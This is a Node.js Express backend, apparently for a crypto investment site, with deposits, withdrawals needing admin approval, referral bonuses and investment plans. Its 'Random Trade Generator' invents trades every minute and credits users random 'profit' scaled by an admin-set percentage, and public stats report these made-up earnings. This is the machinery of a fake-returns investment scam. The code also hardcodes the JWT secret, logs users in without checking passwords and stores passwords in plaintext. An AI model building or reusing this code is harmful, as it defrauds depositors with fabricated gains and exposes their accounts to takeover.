const express = require("express")
const mongoose = require("mongoose")
const cors = require("cors")
const jwt = require("jsonwebtoken")
const Referral = require("./models/Referral")

const app = express()

app.use(cors())
app.use(express.json())

/* ======================
    MongoDB Connect
====================== */

mongoose.connect(process.env.MONGO_URI)
.then(()=> console.log("MongoDB Connected"))
.catch(err => console.log(err));


/* ======================
    Models
====================== */

const User = require("./models/User")
const Deposit = require("./models/Deposit")
const Withdraw = require("./models/Withdraw")
const Plan = require("./models/Plan")
const Crypto = require("./models/Crypto")
const Trade = require("./models/Trade")


/* ======================
    Auth Middleware
====================== */

const auth = (req,res,next)=>{

const token = req.headers.authorization

if(!token) return res.status(401).send("No Token")

try{

const decoded = jwt.verify(token,"secret")

req.user = decoded

next()

}catch{

res.status(401).send("Invalid Token")

}

}


/* ======================
    Login
====================== */

app.post("/api/login", async(req,res)=>{

const {email,password} = req.body

let user = await User.findOne({email})

if(!user){

user = new User({

email,
password,
balance:0,
role:"user"

})

await user.save()

}

const token = jwt.sign({

id:user._id,
role:user.role

},"secret")

res.json({

token,
user

})

})


/* ======================
   Referral Register
====================== */

app.post("/api/register", async (req,res)=>{

const {email,password,ref} = req.body

const user = await User.create({

email,
password,
balance:0

})

if(ref){

await Referral.create({

referrer:ref,
user:user._id

})

const refUser = await User.findById(ref)

if(refUser){

refUser.balance += 5
await refUser.save()

}

}

res.send("Registered")

})

/* ======================
    Dashboard
====================== */

app.get("/api/user/dashboard", auth, async(req,res)=>{

const user = await User.findById(req.user.id)

const plans = await Plan.find({

userId:req.user.id

})

const trades = await Trade.find({

userId:req.user.id

})

let totalProfit = 0

trades.forEach(t=>{

totalProfit += t.profit

})

res.json({

user,
plans,
trades,
totalProfit

})

})



/* ======================
    Deposit
====================== */

app.post("/api/user/deposit", auth, async(req,res)=>{

const {amount,crypto} = req.body

await Deposit.create({

userId:req.user.id,
amount,
crypto,
status:"pending"

})

res.send("Deposit Submitted")

})



/* ======================
    Withdraw
====================== */

app.post("/api/user/withdraw", auth, async(req,res)=>{

const {amount,crypto,address} = req.body

await Withdraw.create({

userId:req.user.id,
amount,
crypto,
address,
status:"pending"

})

res.send("Withdraw Submitted")

})

/* ======================
    Live Stats
====================== */

app.get("/api/live/stats", async (req,res)=>{

const users = await User.countDocuments()

const trades = await Trade.find()

let totalProfit = 0

trades.forEach(t=>{

totalProfit += t.profit

})

res.json({

users,
totalProfit,
trades: trades.length

})

})

/* ======================
    Plans
====================== */

app.post("/api/user/buy-plan", auth, async(req,res)=>{

const {planName,amount,dailyProfit} = req.body

await Plan.create({

userId:req.user.id,
planName,
amount,
dailyProfit,
status:"running"

})

res.send("Plan Started")

})



/* ======================
    Admin Pending
====================== */

app.get("/api/admin/pending", auth, async(req,res)=>{

if(req.user.role !== "admin")
return res.status(403).send("Denied")

const deposits = await Deposit.find({status:"pending"})
const withdraws = await Withdraw.find({status:"pending"})

res.json([...deposits,...withdraws])

})



/* ======================
    Approve Deposit
====================== */

app.post("/api/admin/approve", auth, async(req,res)=>{

if(req.user.role !== "admin")
return res.status(403).send("Denied")

const {txId} = req.body

const deposit = await Deposit.findById(txId)

deposit.status = "approved"

await deposit.save()

const user = await User.findById(deposit.userId)

user.balance += deposit.amount

await user.save()

res.send("Approved")

})



/* ======================
    Approve Withdraw
====================== */

app.post("/api/admin/approve-withdraw", auth, async(req,res)=>{

if(req.user.role !== "admin")
return res.status(403).send("Denied")

const {txId} = req.body

const withdraw = await Withdraw.findById(txId)

withdraw.status = "approved"

await withdraw.save()

const user = await User.findById(withdraw.userId)

user.balance -= withdraw.amount

await user.save()

res.send("Withdraw Approved")

})



/* ======================
    Reject
====================== */

app.post("/api/admin/reject", auth, async(req,res)=>{

if(req.user.role !== "admin")
return res.status(403).send("Denied")

const {txId} = req.body

const deposit = await Deposit.findById(txId)

if(deposit){

deposit.status="rejected"
await deposit.save()

}

const withdraw = await Withdraw.findById(txId)

if(withdraw){

withdraw.status="rejected"
await withdraw.save()

}

res.send("Rejected")

})



/* ======================
    Crypto Wallet
====================== */

app.post("/api/admin/add-crypto", auth, async(req,res)=>{

if(req.user.role !== "admin")
return res.status(403).send("Denied")

const {name,address} = req.body

await Crypto.create({

name,
address

})

res.send("Crypto Added")

})



app.get("/api/user/crypto", async(req,res)=>{

const data = await Crypto.find()

res.json(data)

})

/* ======================
   Admin Profit Control
====================== */

let profitPercent = 3

app.post("/api/admin/profit", auth, (req,res)=>{

if(req.user.role !== "admin")
return res.status(403).send("Denied")

profitPercent = req.body.percent

res.send("Updated")

})

/* ======================
    Random Trade Generator
====================== */

setInterval(async()=>{

const users = await User.find()

users.forEach(async user=>{

if(user.balance > 0){

const profit = Math.random()*profitPercent

await Trade.create({

userId:user._id,
amount:user.balance,
profit:profit

})

user.balance += profit

await user.save()

}

})

},60000)


app.post("/api/admin/profit", auth, (req,res)=>{

if(req.user.role !== "admin")
return res.status(403).send("Denied")

profitPercent = req.body.percent

res.send("Profit Updated")

})


/* ======================
    Server
====================== */

app.listen(5000,()=>{

console.log("Server Running 5000")

})

/* ======================
   Get Referral
====================== */

app.get("/api/user/referral", auth, async (req,res)=>{

const referrals = await Referral.find({

referrer:req.user.id

})

res.json({

link:`http://localhost:3000/register?ref=${req.user.id}`,
total: referrals.length

})

})
